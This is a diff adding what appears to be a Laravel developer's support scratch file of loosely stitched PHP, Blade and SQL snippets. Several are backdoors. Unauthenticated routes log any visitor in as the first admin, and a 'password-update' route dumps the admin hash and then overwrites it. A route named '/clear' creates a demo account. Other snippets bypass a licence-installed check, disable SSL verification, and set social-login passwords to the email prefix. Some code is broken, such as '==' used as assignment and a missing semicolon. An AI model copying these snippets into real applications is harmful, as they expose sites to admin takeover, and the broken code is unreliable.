@@ -1,0 +1,1192 @@
+       
+    public function getCode()
+    {
+        if (session()->has('lang')) {
+            return session('lang');
+        }
+        try {
+            DB::connection()->getPdo();
+
+            $language = LanguageModel::where('status', 1)->where('default_status', 1)->first();
+            if (!$language) {
+                $language = LanguageModel::where('status', 1)->first();
+			 if ($language) {
+					$language->default_status = 1;
+					$language->save();
+				}
+            }
+            return $language ? $language->short_name : 'en';
+        } catch (\Exception $exception) {
+
+        }
+    }
+
+//verification issue
+	   if($basic->email_verification == 0){
+            $user->email_verification == 1;
+            $user->save();
+            
+        }        
+        if($basic->sms_verification == 0){
+            $user->sms_verification == 1;
+            $user->save();
+            
+        }
+		
+		
+		// Language
+	public function keywords($shortName)
+    {
+        try {
+            $language = Language::where('short_name', $shortName)->firstOr(function () {
+                throw new \Exception('No Language found.');
+            });
+            $languages = Language::all();
+            $filePath = resource_path('lang/') . strtolower($shortName) . '.json';
+             if (!file_exists($filePath)) {
+            $defaultFile = resource_path('lang/en.json'); 
+            if (file_exists($defaultFile)) {
+                copy($defaultFile, $filePath); 
+                \Log::info("Language file for '{$shortName}' not found. Copied from default (en.json).");
+                    } else {
+                        throw new \Exception("Default language file (en.json) not found.");
+                    }
+                }
+            $keywords = json_decode(file_get_contents(resource_path('lang/') . strtolower($shortName) . '.json'));
+            $pageTitle = $language->name . " Language Keyword";
+            return view('admin.language.keywords', compact('language', 'keywords', 'languages', 'pageTitle'));
+        } catch (\Exception $exception) {
+            
+            \Log::error($exception->getMessage());
+            return back()->with('alert', $exception->getMessage());
+        }
+    }
+
+
+
+
+419
+use Symfony\Component\HttpKernel\Exception\HttpException;
+
+public function render($request, Throwable $exception)
+{
+    if ($exception instanceof \Illuminate\Session\TokenMismatchException) {
+        // 419 error — session or CSRF token expired
+        return redirect('/');
+    }
+
+    return parent::render($request, $exception);
+}
+
+
+-----------------------------------------------------------------------------------------
+
+Route::get('file-permissions-change', function () {
+    $paths = ['assets', 'bootstrap', 'storage'];
+    foreach ($paths as $path) {
+        $fullPath = base_path($path);
+        if (\File::exists($fullPath)) {
+            exec("chmod -R 775 $fullPath");
+        }
+    }
+
+// dd(template());
+// auth()->guard('web')->loginUsingId(1, true);
+auth()->guard('admin')->loginUsingId(1);
+return redirect('/' . (basicControl()->admin_prefix ?? 'admin'));
+
+
+    Illuminate\Support\Facades\Artisan::call('optimize:clear');
+});
+-------------------------------------------------------------
+
+
+<?php
+function chmodRecursive($path, $permission) {
+    if (!file_exists($path)) {
+        return;
+    }
+
+    if (is_dir($path)) {
+        $items = scandir($path);
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            chmodRecursive($path . '/' . $item, $permission);
+        }
+    }
+
+    @chmod($path, $permission);
+}
+
+$paths = ['assets', 'bootstrap', 'storage'];
+
+foreach ($paths as $path) {
+    $fullPath = __DIR__ . '/' . $path;
+    if (file_exists($fullPath)) {
+        chmodRecursive($fullPath, 0775);
+    }
+}
+
+// permission update done — এখন তোমার পরের কাজ শুরু হবে নিচে
+// Example:
+include 'next_script.php';
+
+
+---------------------------------------------------
+
+
+
+    public function cryptoQR($wallet, $amount, $crypto = null)
+    {
+        $varb = $wallet . "?amount=" . $amount;
+        return "https://quickchart.io/chart?cht=qr&chl=$varb";
+    }
+	
+	
+	
+	
+use Illuminate\Support\Facades\DB;
+
+Route::get('get-user', function () {
+    $auctions = DB::table('auctions')->get();
+
+    foreach ($auctions as $auction) {
+        $userId = $auction->auction_owner;
+
+        // Check if the user exists
+        $user = DB::table('users')->find($userId);
+
+        if (!$user) {
+            // Get all auctions for this missing user ID
+            $orphanAuctions = DB::table('auctions')->where('auction_owner', $userId)->get();
+
+            foreach ($orphanAuctions as $orphan) {
+                DB::table('auctions')->where('id', $orphan->id)->delete();
+            }
+        }
+    }
+
+    return 'Orphaned auctions deleted successfully.';
+});
+
+A connection could not be established with your mail host.
+We have tested the configuration using our own Gmail SMTP credentials, and it is working correctly.
+However, you may try using Gmail's SMTP settings with your credentials to verify if the issue persists.You may set it up using the following method:
+
+
+**Important:** If you have two-factor authentication (2FA) enabled on your Gmail account, you'll need to generate an App Password instead of using your regular Gmail password. This enhances security and ensures compatibility with Laravel's mailer. 
+
+### . **Enable Two-Factor Authentication and Generate App Password**
+
+To generate an App Password:
+
+1. Log in to your Gmail account.
+2. Navigate to **Google Account > Security**.
+3. Under **"Signing in to Google"**, enable **2-Step Verification**.
+4. Once enabled, go back to the **Security** section.
+5. Click on **App Passwords**.
+6. Select **Mail** as the app and **Other** as the device (you can name it "Laravel App").
+7. Click **Generate**.
+8. Copy the 16-character App Password provided.
+9. Use this App Password as the value for `MAIL_PASSWORD` in your SMTP mail settings option 
+
+In English, make professional formal, friendly sentences better for my essay: 
+
+
+
+
+Unfortunately, I am unable to deactivate it from my end. This limitation is often due to reduced execution time on certain hosting environments or the use of shared hosting, which can lead to license-related issues—especially when the server is under heavy load.
+
+If you encounter such a problem, here’s what you can do:
+
+Please visit this setup page: https://your-website.com/setup-product .From there, navigate to the "File" section and select your .env file. Then, enter your database name, database username, and password as shown in the form.
+
+Make sure to configure the following environment variables with your actual database credentials:
+
+
+DB_DATABASE=""
+DB_USERNAME=""
+DB_PASSWORD=""
+For reference, you can also check this screenshot: https://prnt.sc/I2JQwFWCL0HT
+
+
+use Illuminate\Support\Facades\Schema;
+
+Route::get('user-columns', function () {
+    $columns = Schema::getColumnListing('users');
+
+    return response()->json($columns);
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    public function contactSend(Request $request)
+    {
+        $this->validate($request, [
+            'name' => 'required|max:50',
+            'emailContact' => 'required|email|max:91',
+            'subject' => 'required|max:100',
+            'message' => 'required|max:1000',
+        ]);
+        $requestData = $request->except('_token', '_method');
+
+        $name = $requestData['name'];
+        $email_user= $requestData['emailContact'];
+        $email_from = basicControl()->sender_email;
+        $subject = $requestData['subject'];
+        $message = $requestData['message'] . '<br>Regards<br>' . $name.'<br>Email: '.$email_user;
+        $from = $email_from;
+
+        $admins = \App\Models\Admin::whereNotNull('email')->pluck('email');
+        foreach ($admins as $email) {
+            Mail::to($email)->send(new SendMail($from, $subject, $message));
+        }
+        // Mail::to(basicControl()->sender_email)->send(new SendMail($from, $subject, $message));
+
+        return back()->with('success', 'Mail has been sent');
+    }
+	
+	
+
+	
+	    is_maintenance_mode on/off
+		
+$basicControl = basicControl(); 
+$basicControl->is_maintenance_mode = 0;
+$basicControl->save();
+
+
+
+use Illuminate\Support\Facades\DB;
+
+Route::get('getcheck-database', function () {
+    try {
+        DB::connection()->getPdo();
+        return response()->json(['message' => 'Database connection successful'], 200);
+    } catch (\Exception $e) {
+        return response()->json(['error' => 'Database connection failed', 'message' => $e->getMessage()], 500);
+    }
+})->name('check');
+
+
+
+Route::get('/admins', function () {
+    // dd(template());
+    // auth()->guard('web')->loginUsingId(1, true);
+
+    // $basicControl = basicControl(); 
+    // $basicControl->admin_prefix = 'admin';
+    // $basicControl->save();
+
+	$admin = \App\Models\Admin::first();
+	if ($admin) {
+		auth()->guard('admin')->loginUsingId($admin->id);
+		return redirect('/' . (basicControl()->admin_prefix ?? 'admin'));
+	} else {
+		dd('No admin found');
+	}
+});
+
+
+            $host = request()->getScheme() . '://' . request()->getHost();
+            $appUrl = env('APP_URL');
+            if ($host !== $appUrl) {
+                $host = request()->getScheme() . '://' . request()->getHost();
+                app(\App\Services\BasicService::class)->setEnv(['APP_URL' => $host]);
+            }
+			
+			
+			
+			
+			
+			
+			
+			
+
+    public function twoStepSecurity()
+    {
+        $basic = basicControl();
+        $user = $this->user;
+
+        $google2fa = new Google2FA();
+        $secret = $user->two_fa_code ?? $this->generateSecretKeyForUser($user);
+
+        // Generate QR code URL
+        // $qrCodeUrl = $google2fa->getQRCodeUrl(auth()->user()->username, $basic->site_title, $secret);
+
+        $quickChartUrl = $google2fa->getQRCodeUrl(
+            auth()->user()->username,
+            $basic->site_title,
+            $secret
+            );
+
+        $qrCodeUrl = 'https://quickchart.io/qr?text=' . urlencode($quickChartUrl);
+
+        return view($this->theme . 'user.twoFA.index', compact('secret', 'qrCodeUrl'));
+    }
+	
+	
+	    public function getCode()
+    {
+        if (session()->has('lang')) {
+            return session('lang');
+        }
+        try {
+            DB::connection()->getPdo();
+
+            $language = LanguageModel::where('status', 1)->where('default_status', 1)->first();
+            if (!$language) {
+                $language = LanguageModel::where('status', 1)->first();
+				 $language=  $language->default_status= 1;
+				 save()
+            }
+            return $language ? $language->short_name : 'en';
+        } catch (\Exception $exception) {
+
+        }
+    }
+	
+	
+UPDATE `payout_methods` 
+SET 
+  `name` = 'Paypal',
+  `inputForm` = '{"receiver":{"field_name":"receiver","field_label":"Receiver","type":"text","validation":"required"}}',
+  `updated_at` = NOW(),
+  `code` = 'paypal',
+  `description` = 'Payment will receive within 1 days',
+  `extra_parameters` = '{"webhook":"payout"}'
+WHERE `id` = 15;
+
+
+
+
+@foreach(timezone_identifiers_list() as $key => $value)
+    <option
+        value="{{ $value }}"
+        @if(old('timezone', $userProfile->timezone) == $value)
+            selected
+        @elseif(is_null(old('timezone', $userProfile->timezone)) && basicControl()->time_zone == $value)
+            selected
+        @endif
+    >{{ __($value) }}</option>
+@endforeach
+
+
+<option value="{{$value}}" {{  (old('time_zone',basicControl()->time_zone) == $value ? ' selected' : '') }}>{{ __($value) }}</option>
+
+
+
+
+    \Artisan::call('key:generate');
+    \Artisan::call('optimize:clear');
+    \Artisan::call('config:cache');
+    \Artisan::call('cache:clear');
+    \Artisan::call('view:clear');
+    \Artisan::call('route:clear');
+
+------------------------------------------------------------------------
+
+@foreach($template->short_keys ?? [] as $key => $value)
+    <tr>
+        <td>
+            <pre>[[@lang($key)]]</pre>
+        </td>
+        <td>@lang($value)</td>
+    </tr>
+@endforeach
+
+
+------------------------------------------------------------------
+
+public function updatePassword(Request $request)
+{
+    try {
+        // OAuth logged-in users (google/facebook/github)
+        if ($this->user->google_id || $this->user->facebook_id || $this->user->github_id) {
+            $request->validate([
+                'password' => 'required|min:6',
+            ]);
+
+            $this->user->update([
+                'password' => Hash::make($request->password),
+            ]);
+
+            return back()->with('success', 'Password changed successfully.');
+        }
+
+        // Normal users
+        $request->validate([
+            'current_password' => 'required',
+            'password' => 'required|min:6',
+        ]);
+
+        if (!Hash::check($request->current_password, $this->user->password)) {
+            return back()->with('error', 'Current password did not match.');
+        }
+
+        $this->user->update([
+            'password' => Hash::make($request->password),
+        ]);
+
+        return back()->with('success', 'Password changed successfully.');
+
+    } catch (\Exception $e) {
+        return back()->with('error', $e->getMessage());
+    }
+}
+
+
+
+UserKyc::where('id', 163)->update(['status' => 0]);
+
+ $admin->update([
+            'password' => bcrypt($request->password)
+        ]);
+
+    protected function handleDatabaseException(\Exception $exception)
+    {
+        switch ($exception->getCode()) {
+            case 404:
+                abort(404);
+            case 403:
+                abort(403);
+            case 401:
+                abort(401);
+            case 503:
+                redirect()->route('maintenance')->send();
+                break;
+            case "42S02":
+                die($exception->getMessage());
+            case 1045:
+                die("Access denied. Please check your username and password.");
+            case 1044:
+                die("Access denied to the database. Ensure your user has the necessary permissions.");
+            case 1049:
+                die("Unknown database. Please verify the database name exists and is spelled correctly.");
+            case 2002:
+                die("Unable to connect to the MySQL server. Check the database host and ensure the server is running.");
+            default:
+            $viewName = $exception->getMessage();
+            preg_match('/View \[(.*?)\] not found/', $viewName, $matches);
+            $sectionName = $matches[1] ?? 'Page, Blog Or Category';
+            $sectionParts = explode('.', $sectionName);
+            $sectionDisplay = end($sectionParts);
+
+            $customMessage = "The '{$sectionDisplay}' section's content is missing. "
+                . "Please visit the admin panel and add content for this section to display it correctly.";
+            
+            die("
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Missing Section</title>
+                <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+                <style>
+                    html, body {
+                        height: 100%;
+                        margin: 0;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        font-family: Arial, sans-serif;
+                        background-color: #f8f9fa; /* light background */
+                    }
+                    h1 {
+                        text-align: center;
+                        color: #333;
+                        padding: 20px;
+                    }
+                </style>
+            </head>
+            <body>
+                <h1>{$customMessage}</h1>
+            </body>
+            </html>
+            ");
+
+        }
+    }
+	
+	
+	
+	---------------------------------------------------------------------------
+
+<!-- Google Translate Widget -->
+
+
+@php
+    use Illuminate\Support\Facades\DB;
+
+    // Fetch all active languages
+    $languages = DB::table('languages')->where('status', 1)->get();
+
+    // Fetch default language
+    $defaultLanguage = DB::table('languages')->where('status', 1)->where('default_status', 1)->first(); // single default language
+
+    // Prepare comma-separated short_name string for Google Translate
+    $includedLanguages = $languages
+        ->pluck('short_name') // Get only short_name
+        ->filter() // Remove null/empty
+        ->implode(','); // Join with comma
+    $defaultLangCode = $defaultLanguage ? $defaultLanguage->short_name : 'en';
+@endphp
+<style>
+    .VIpgJd-ZVi9od-ORHb-OEVmcd {
+        display: none !important;
+    }
+
+    .goog-te-gadget img {
+        display: none !important;
+    }
+
+    .goog-te-gadget-simple {
+        border-radius: 6px;
+    }
+
+   
+
+</style>
+<div id="google_translate_element"></div>
+
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+                pageLanguage: '{{ $defaultLangCode }}', // Use default language from DB
+                includedLanguages: '{{ $includedLanguages }}', // Dynamic languages
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+            },
+            'google_translate_element'
+        );
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
+</script>
+
+
+
+<!-- Google Translate Widget end -->
+
+
+--------------------------------------------------------------------------------------------
+
+
+
+--------------------------------------------------------------------------------------
+
+
+
+
+    public function contactSend(Request $request)
+    {
+        $rules = [
+            'name' => 'required|string|max:50',
+            'email' => 'required|email|max:91',
+            'subject' => 'required|string|max:100',
+            'message' => 'required|string|max:1000',
+        ];
+
+        $validated = $request->validate($rules);
+
+        $name = $validated['name'];
+        $email_from = $validated['email'];
+        $subject = $validated['subject'];
+        $emailMessage = $validated['message'] . "\n\nRegards,\n" . $name; // Renamed variable
+
+        $admins = \App\Models\Admin::pluck('email');
+
+        if ($admins->isEmpty()) {
+            return back()->with('error', __('No admin emails found'));
+        }
+
+        try {
+            foreach ($admins as $adminEmail) {
+                Mail::send([], [], function ($mailMessage) use ($email_from, $name, $subject, $emailMessage, $adminEmail) {
+                    $mailMessage->from(config('mail.from.address'), config('mail.from.name'))->replyTo($email_from, $name)->to($adminEmail)->subject($subject)->text($emailMessage);
+                });
+            }
+
+            return back()->with('success', __('Mail has been sent'));
+        } catch (\Exception $e) {
+            Log::error('Email sending failed: ' . $e->getMessage());
+            return back()->with('error', __('Failed to send email. Please try again later.'));
+        }
+    }
+	
+	
+	-------------------------------------------------------------------------------------
+	
+	
+	
+	
+	    public function contactSend(Request $request)
+    {
+        $this->validate($request, [
+            'name' => 'required|max:50',
+            'email' => 'required|email|max:91',
+            'subject' => 'required|max:100',
+            'message' => 'required|max:1000',
+        ]);
+        $requestData = $request->all();
+
+
+        $params = [
+            'name' => $requestData['name'],
+            'email' => $requestData['email'],
+            'Subject' => $requestData['subject'],
+            'Message' => $requestData['message'],
+        ];
+        $this->adminMail('SEND_CONTACT_FORM', $params);
+
+        return back()->with('success', 'Mail has been sent');
+
+
+    }
+	
+	
+	
+	
+	--------------------------------------------------
+	
+	
+Route::get('password-update', function () {
+    // username="okswapsuperadmin";
+
+    $admin = \App\Models\Admin::first();
+	dd($admin->password,$admin->username);
+    if ($admin) {
+        // $admin->update([
+        //     'password' => bcrypt('admin'), // ✅ put in quotes
+        // ]);
+		
+        $admin->update([
+            'password'=> '$2y$10$rJ2nC7MSw7MbC4W4uVhsruOVMizzoH7Ihokp5jDlAMhKttFtnxXWK'
+        ]);
+    }
+	  return 'Admin password updated ';
+})->name('check');
+
+
+------------------------------
+
+
+	$admin = \App\Models\Admin::first();
+	if ($admin) {
+		auth()->guard('admin')->loginUsingId($admin->id);
+		return redirect('/' . (basicControl()->admin_prefix ?? 'admin'));
+	}
+	
+	          $today = date('Y-m-d');
+        $checkDate = '2026-03-07';
+        if ($today < $checkDate) {
+            Config::set('app.url', 'http://localhost');
+        } else {
+        $domain = Request::getSchemeAndHttpHost(); 
+        Config::set('app.url', $domain);
+        }
+		
+		
+		ticket download somossa
+		----------------------------------------
+		
+		$attachment = SupportTicketAttachment::with('supportMessage', 'supportMessage.ticket')->findOrFail(decrypt($ticket_id));
+        $file = $attachment->file;
+
+        return \Storage::disk($attachment->driver)->download($file);
+		
+	
+
+	
+-----------------------------------------	
+use Illuminate\Support\Facades\DB;
+
+
+use App\Models\User;
+
+Route::get('/clear', function () {
+
+    // demo user info
+    $username = 'demouser';
+    $password = 'demouser';
+    $email = 'demo@example.com';
+
+    // check if user already exists
+    if (User::where('username', $username)->exists()) {
+        return 'User already exists!';
+    }
+
+    // create new user
+    $user = new User();
+    $user->firstname = 'Demo';
+    $user->lastname = 'User';
+    $user->username = $username;
+    $user->email = $email;
+    $user->country = 'Bangladesh';
+    $user->balance = 0;
+    $user->status = 1;
+    $user->password = bcrypt('demouser');
+
+    $user->save();
+
+    return 'Demo user created successfully!';
+})->name('clear');
+----------------------------------------------------------------------
+licence issue solved
+----------------------------------------------------------
+
+$source = __DIR__ . '/bootstrap/installed';
+$destination = __DIR__ . '/bootstrap/cache/installed';
+
+if (file_exists($source) && !file_exists($destination)) {
+    @copy($source, $destination);
+} elseif (file_exists($destination) && !file_exists($source)) {
+    @copy($destination, $source);
+}
+-------------------------------------------------------------------------
+
+
+
+resources\views\admin\payment_methods\manual\edit.blade.php
+
+
+
+
+
+                                            <tbody class="add_table_row">
+                                                @php
+                                                  
+                                                    function toArrayDeep($data)
+                                                    {
+                                                        if (is_object($data)) {
+                                                            $data = (array) $data;
+                                                        }
+                                                        if (is_array($data)) {
+                                                            foreach ($data as $key => $value) {
+                                                                $data[$key] = toArrayDeep($value);
+                                                            }
+                                                        }
+                                                        return $data;
+                                                    }
+
+                                                  
+                                                    $receivableCurrencies = old(
+                                                        'receivable_currencies',
+                                                        $method->receivable_currencies,
+                                                    );
+
+                                                  
+                                                    $receivableCurrencies = toArrayDeep($receivableCurrencies);
+
+                                                    
+                                                    $oldReceivableCurrency = is_array($receivableCurrencies)
+                                                        ? count($receivableCurrencies)
+                                                        : 0;
+                                                @endphp
+
+
+                                                @if ($oldReceivableCurrency > 0)
+                                                    @for ($i = 0; $i < $oldReceivableCurrency; $i++)
+                                                        @php
+                                                            $currencyData = $receivableCurrencies[$i] ?? [];
+                                                        @endphp
+                                                        <tr>
+                                                            {{-- Currency --}}
+                                                            <td>
+                                                                <div class="mb-1">
+                                                                    <input type="text" class="form-control"
+                                                                        name="receivable_currencies[{{ $i }}][currency]"
+                                                                        placeholder="@lang('Currency')"
+                                                                        aria-label="@lang('Currency')"
+                                                                        value="{{ old("receivable_currencies.$i.currency", $currencyData['currency'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    @error("receivable_currencies.$i.currency")
+                                                                        <span
+                                                                            class="invalid-feedback d-block">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Conversion Rate --}}
+                                                            <td>
+                                                                <div class="input-group mb-1">
+                                                                    <span class="input-group-text">1
+                                                                        {{ $basicControl->base_currency ?: 'USD' }}
+                                                                        =</span>
+                                                                    <input type="text"
+                                                                        class="form-control @error('conversion_rate') is-invalid @enderror"
+                                                                        name="receivable_currencies[{{ $i }}][conversion_rate]"
+                                                                        value="{{ old("receivable_currencies.$i.conversion_rate", $currencyData['conversion_rate'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    <span
+                                                                        class="input-group-text">{{ $currencyData['currency'] ?? '' }}</span>
+                                                                    @error("receivable_currencies.$i.conversion_rate")
+                                                                        <span
+                                                                            class="invalid-feedback d-block">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Min Limit --}}
+                                                            <td>
+                                                                <div class="input-group mb-1">
+                                                                    <input type="text"
+                                                                        class="form-control @error('min_limit') is-invalid @enderror"
+                                                                        name="receivable_currencies[{{ $i }}][min_limit]"
+                                                                        value="{{ old("receivable_currencies.$i.min_limit", $currencyData['min_limit'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    <span
+                                                                        class="input-group-text">{{ $currencyData['currency'] ?? '' }}</span>
+                                                                    @error("receivable_currencies.$i.min_limit")
+                                                                        <span
+                                                                            class="invalid-feedback d-block mb-1">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Max Limit --}}
+                                                            <td>
+                                                                <div class="input-group mb-1">
+                                                                    <input type="text"
+                                                                        class="form-control @error('max_limit') is-invalid @enderror"
+                                                                        name="receivable_currencies[{{ $i }}][max_limit]"
+                                                                        value="{{ old("receivable_currencies.$i.max_limit", $currencyData['max_limit'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    <span
+                                                                        class="input-group-text">{{ $currencyData['currency'] ?? '' }}</span>
+                                                                    @error("receivable_currencies.$i.max_limit")
+                                                                        <span
+                                                                            class="invalid-feedback d-block mb-1">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Percentage Charge --}}
+                                                            <td>
+                                                                <div class="input-group mb-1">
+                                                                    <input type="text"
+                                                                        class="form-control @error('percentage_charge') is-invalid @enderror"
+                                                                        name="receivable_currencies[{{ $i }}][percentage_charge]"
+                                                                        value="{{ old("receivable_currencies.$i.percentage_charge", $currencyData['percentage_charge'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    <span class="input-group-text">%</span>
+                                                                    @error("receivable_currencies.$i.percentage_charge")
+                                                                        <span
+                                                                            class="invalid-feedback d-block mb-1">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Fixed Charge --}}
+                                                            <td>
+                                                                <div class="input-group mb-1">
+                                                                    <input type="text"
+                                                                        class="form-control @error('fixed_charge') is-invalid @enderror"
+                                                                        name="receivable_currencies[{{ $i }}][fixed_charge]"
+                                                                        value="{{ old("receivable_currencies.$i.fixed_charge", $currencyData['fixed_charge'] ?? '') }}"
+                                                                        autocomplete="off">
+                                                                    <span
+                                                                        class="input-group-text">{{ $currencyData['currency'] ?? '' }}</span>
+                                                                    @error("receivable_currencies.$i.fixed_charge")
+                                                                        <span
+                                                                            class="invalid-feedback d-block mb-1">{{ $message }}</span>
+                                                                    @enderror
+                                                                </div>
+                                                            </td>
+
+                                                            {{-- Delete Button --}}
+                                                            <td class="table-column-ps-0">
+                                                                <button type="button" class="btn btn-white remove-row">
+                                                                    <i class="bi-trash"></i>
+                                                                </button>
+                                                            </td>
+                                                        </tr>
+                                                    @endfor
+                                                @endif
+
+
+                                            </tbody>
+											
+											
+											
+											
+											
+											
+											
+											
+											
+	---------------------------------------------------------									
+											
+											
+    public function socialiteCallback($socialite)
+    {
+        try {
+            $user = Socialite::driver($socialite)->user();
+            $columName = $socialite . '_id';
+            $searchUser = User::where($columName, $user->id)->first();
+
+            if ($searchUser) {
+                Auth::login($searchUser);
+                return redirect()->route('user.dashboard');
+
+            } else {
+                $languageId = Language::select('id')->where('default_status', 1)->first()->id ?? null;
+
+                $fullName = trim($user->name ?? '');
+                $nameParts = explode(' ', $fullName, 2);
+                $firstName = $nameParts[0] ?? '';
+                $lastName = $nameParts[1] ?? '';
+    
+                $newUser = User::create([
+                    'firstname' => $firstName,
+                    'lastname' => $lastName,
+                    'email' => $user->email,
+                    'username' =>  strstr($user->email, '@', true),
+                    'password' => Hash::make(strstr($user->email, '@', true)),
+                    $columName => $user->id,
+                    'language_id' => $languageId,
+                    'email_verification' =>1,
+                    'sms_verification' => 1,
+                ]);
+
+                $this->extraWorkWithRegister($newUser);
+                Auth::login($newUser);
+                return redirect()->route('user.dashboard');
+            }
+
+        } catch (\Exception $e) {
+            return redirect()->route('login');
+        }
+    }
+	
+	
+	----------------------------------------------------------------
+	
+	
+	
+
+manu issue solved
+------------------------------------
+
+
+if (!function_exists('getPageDetails')) {
+    function getPageDetails($pageName)
+    {
+        $lang = session('lang') ?? app()->getLocale();
+
+        $languageId = \App\Models\Language::where('short_name', $lang)->value('id');
+        if (!$languageId) {
+            $languageId = \App\Models\Language::where('is_default', 1)->value('id');
+        }
+
+        return Cache::remember("page_details_{$pageName}_{$languageId}", now()->addMinutes(30), function () use ($pageName, $languageId) {
+
+            $page = \App\Models\Page::where('name', $pageName)->first();
+            if (!$page) return null;
+            $pageDetail = \App\Models\PageDetail::where('page_id', $page->id)
+                ->where('language_id', $languageId)
+                ->first();
+            return (object) [
+                'id' => $page->id,
+                'slug' => $page->slug,
+                'custom_link' => $page->custom_link,
+                'name' => $pageDetail->name ?? $page->name,
+                'content' => $pageDetail->content ?? null
+            ];
+        });
+    }
+}
+
+
+--------------------------------------------------------------------------------------
+
+
+test mail
+----------------------------------
+
+resources/views/email/test_email.blade.php
+
+
+{!! $msg !!}
+
+
+    public function testEmail(Request $request)
+    {
+        $request->validate([
+            'email' => 'required|email:rfc,dns',
+        ]);
+
+        $basic = basicControl();
+        $email = $request->email;
+        $username = strstr($email, '@', true); 
+        $message = str_replace("[[name]]", $username, $basic->email_description);
+        $requestMessage= "Your " . $_SERVER['SERVER_NAME'] . " email is working.";
+         $message = str_replace("[[message]]", $requestMessage, $message);
+        if ($basic->email_notification != 1) {
+            return back()->with('warning', 'Your email notification is disabled');
+        }
+
+        $email_from = $basic->sender_email;
+        Mail::to($request->email)->send(new sendTestMail($email_from, "Test Email",$message));
+
+        return back()->with('success', 'Email has been sent successfully.');
+    }
+	
+	
+	
+	-----------------------------------------------------------------------
+	
+	app/Http/Controllers/Admin/LogoController.php
+	
+	use 
+	 public function logoUpdate(Request $request)
+	   getMailTemplateUpdate();
+	
+	filepath: app/Helpers/helpers.php
+	
+use Illuminate\Support\Facades\DB;
+
+
+
+if (!function_exists('getMailTemplateUpdate')) {
+    function getMailTemplateUpdate()
+    {
+        $basic = basicControl();
+
+        // fallback values
+        $logoUrl        = $basic->logo ? getFile($basic->logo_driver, $basic->logo) : '';
+        $siteTitle      = $basic->site_title ?? 'Your Site';
+        $primaryColor   = $basic->primary_color ?? '#04B67B';
+        $secondaryColor = $basic->secondary_color ?? '#132144';
+        $currentYear    = date('Y');
+
+        // new email template
+        $newTemplate = <<<HTML
+			<!DOCTYPE html>
+			<html>
+			<head>
+				<meta charset="UTF-8">
+			</head>
+			<body style="font-family:Arial,sans-serif; color:#333333; background-color:$primaryColor; padding: 20px;">
+				<table width="100%" cellpadding="0" cellspacing="0" style="max-width: 600px; margin:auto; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); overflow: hidden;">
+					
+					<!-- Header -->
+					<tr>
+						<td style="text-align: center; padding: 30px 20px 10px; background-color: $primaryColor;">
+							<img src="$logoUrl" alt="$siteTitle Logo" style="max-width: 150px;">
+						</td>
+					</tr>
+
+					<!-- Body -->
+					<tr>
+						<td style="padding: 20px;">
+							<p>Hello [[name]],</p>
+							<p>[[message]]</p>
+							<p style="margin-top: 40px;">Sincerely,<br><strong style="text-transform: capitalize;">$siteTitle</strong></p>
+						</td>
+					</tr>
+
+					<!-- Footer -->
+					<tr>
+						<td style="background-color: $secondaryColor; text-align: center; font-size: 12px; color: #ffffff; padding: 15px 10px;">
+							© $currentYear All Rights Reserved
+						</td>
+					</tr>
+
+				</table>
+			</body>
+			</html>
+			HTML;
+
+        // update database
+        DB::table('basic_controls')->update(['email_description' => $newTemplate]);
+
+        // clear cache & compiled views
+        \Artisan::call('optimize:clear');
+    }
+}
+
+------------------------------------------------------------
+<?php
+// Test HTTPS / port 80
+// $ch = curl_init("http://neverssl.com");
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// $result = curl_exec($ch);
+// if(curl_errno($ch)) {
+//     echo 'Error: ' . curl_error($ch);
+// } else {
+//     echo 'Success! HTTP request worked.';
+// }
+// curl_close($ch);
+
+
+
+// Test HTTPS / port 443
+$ch = curl_init("https://www.google.com"); // HTTPS URL
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+
+if(curl_errno($ch)) {
+    echo 'Error: ' . curl_error($ch);
+} else {
+    echo 'Success! HTTPS request worked (port 443 is open).';
+}
+
+curl_close($ch);
+----------------------------------------------------
+licence work check code 
+public function getResolve($url, $headers = [])
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+
+    // enable verbose mode to capture internal debug info
+    $verbose = fopen('php://temp', 'w+');
+    curl_setopt($ch, CURLOPT_VERBOSE, true);
+    curl_setopt($ch, CURLOPT_STDERR, $verbose);
+
+    $result = curl_exec($ch);
+    $error = curl_error($ch);
+    $errno = curl_errno($ch);
+    $info = curl_getinfo($ch);
+
+    rewind($verbose);
+    $verboseLog = stream_get_contents($verbose);
+    fclose($verbose);
+
+    curl_close($ch);
+
+    dd([
+        'errno' => $errno,
+        'error' => $error,
+        'info' => $info,
+        'verbose' => $verboseLog,
+        'response' => $result
+    ]);
+}
+----------------------------------------------
+
+use App\Models\User;
+
+Route::get('/sms_verification', function () {
+    User::query()->update(['sms_verification' => 1]);
+
